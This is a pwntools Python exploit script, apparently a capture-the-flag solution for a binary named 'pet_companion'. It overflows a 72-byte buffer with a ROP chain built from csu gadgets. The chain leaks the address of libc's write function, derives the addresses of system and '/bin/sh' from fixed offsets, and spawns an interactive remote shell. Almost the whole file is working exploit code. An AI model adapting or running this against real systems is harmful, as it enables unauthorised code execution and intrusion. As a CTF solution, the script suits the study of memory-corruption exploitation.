#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './pet_companion')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'host'
port = int(args.PORT or 12345)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('glibc/libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('glibc/libc.so.6')
else:
    libc = ELF('glibc/libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./glibc/'

io = start()

# GADGETS
ret = 0x00000000004004de
gadget_1 = 0x000000000040073a
gadget_2 = 0x0000000000400720
pop_rdi = 0x0000000000400743

payload = b''
payload += b'a'*72

payload = b''
payload += b'a'*72

payload += p64(gadget_1)
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(exe.got.write) #r12
payload += p64(1) + p64(exe.got.write) + p64(8) # r13, r14, r15 -> rdi, rsi, rdx
payload += p64(gadget_2)
payload += p64(0) * 7 #padding
payload += p64(exe.sym.main) # return to main

io.recvuntil(b'status:')
io.sendline(payload)

io.recvuntil(b'[*] Configuring...\n\n')

output = io.recvline().strip().split(b' ')
write_plt = u64(output[0])
system_plt = write_plt - 0xc0cd0
bin_sh = write_plt + 0xa3c98

log.info("Leaked PLT write address: " + hex(write_plt))
log.info("PLT system address: " + hex(system_plt))
log.info("Shell string address: " + hex(bin_sh))

payload = b''
payload += b'a'*72
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret) # stack alignment
payload += p64(system_plt)
payload += p64(0) # return address

io.recvuntil(b'status:')
io.sendline(payload)

# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
io.close()
